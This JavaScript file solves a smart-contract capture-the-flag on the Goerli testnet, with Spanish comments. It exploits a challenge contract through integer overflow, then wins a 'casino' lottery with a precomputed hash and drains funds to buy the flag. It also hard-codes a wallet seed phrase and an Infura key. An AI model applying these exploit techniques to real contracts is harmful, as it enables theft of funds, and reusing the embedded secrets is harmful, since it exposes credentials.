const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");

const apuntarseABI = require("../contracts/apuntarse.json").abi;
const apuntarseAdd = "0xe5BF0102f0a20f3b0675A417E484973e216754D6";

const casinoABI = require("../contracts/casino.json").abi;
const casinoAdd = "0x52f40D77eFf9950580411720E1F7C93ADdbC0D45";

const provider = new HDWalletProvider("attract guide large mandate ketchup hub awake elder zoo dignity color sort", "https://goerli.infura.io/v3/708c5de2e3ba4c1181691cd1d765d60e", 0)
const web3 = new Web3(provider);

async function apuntarse() {

    //Creamos una nueva instancia del contrato mediante la libreria web3.js y su función .eth.Contract(ABI, ADDRESS) pasandole los parámetros importados 
    const apuntarse = new web3.eth.Contract(apuntarseABI, apuntarseAdd);

    //Llamamos a la funcion getAccounts() que nos devuelve un array de todas las cuentas de las que dispone
    const signer = await web3.eth.getAccounts();
    console.log(signer[0]);

    //Creamos el payload del mensaje:
        //Conociendo que los slots de la EVM son de 32Bytes, deberemos crear un payload en HEX de 32Bytes = true 
    let payload = "0x0000000000000000000000000000000000000000000000000000000000000001";

    //La direción es irrelevante
    let add = "0xf4EEbcb9B94087e1Fe05d97789B9771F6EC5337B";
    
    //255 Para el overflow
    let number = 255;   

    //Enviamos la transacción
    await apuntarse.methods.apuntarseCTF(payload, add, number).send({from: signer[0], gas: 4500000, gasPrice:10000000000 });

    //Comprobamos que nos hayamos apuntado correctamente
    const apuntado = await apuntarse.methods.apuntado().call({from: signer[0], gas: 4500000, gasPrice:10000000000 });
    console.log(apuntado);

}

apuntarse();

async function casino() {

    //Creamos una nueva instancia del contrato mediante la libreria web3.js y su función .eth.Contract(ABI, ADDRESS) pasandole los parámetros importados 
    const casino = new web3.eth.Contract(casinoABI, casinoAdd);
    
    //Llamamos a la funcion getAccounts() que nos devuelve un array de todas las cuentas de las que dispone
    const signer = await web3.eth.getAccounts();

    //uint256 = keccak256("Pseudo_are_safu")
    let payload = "0x5304e3777d25c9f43b9dc5c8ebb5f2d7f80da15e74e48810f2965c6636b2fee2";

    //Nos apuntamos en el casino
    await casino.methods.apuntarse().send({from: signer[0], gas: 4500000, gasPrice:10000000000 });

    //Llamamos a loteria 3 veces con nuestro payload, ya que para pagarnos la coin requiere que ganemos al menos dos veces
    await casino.methods.lotto(payload).send({from: signer[0], gas: 4500000, gasPrice:10000000000 });
    await casino.methods.lotto(payload).send({from: signer[0], gas: 4500000, gasPrice:10000000000 });
    await casino.methods.lotto(payload).send({from: signer[0], gas: 4500000, gasPrice:10000000000 });

    //Llamamos a la función que valida que hayamos ganado más de dos veces y nos devuelva el token
    const lotto_winner = await casino.methods.lotto_validator().send({from: signer[0], gas: 4500000, gasPrice:10000000000 });
    
    //Añadimos funds al casino para poder retirarlos
    await casino.methods.addFunds().send({from: signer[0], gas: 4500000, gasPrice:10000000000 });

    //Llamamos a la función retrieveFundsValidator para explotar retrieveFunds
    const result = await casino.methods.retrieveFundsValidator(10).send({from: signer[0], gas: 4500000, gasPrice:10000000000 });

    //Llamamos a la función getCoins() que nos devuelve las monedas que tenemos, y comparemos que sea >= que son las requeridas para comprar la flag
    const coins_got = await casino.methods.getCoins().call({from: signer[0], gas: 4500000, gasPrice:10000000000 });
    const winner = coins_got >= 2;
    console.log(winner);

}

casino();
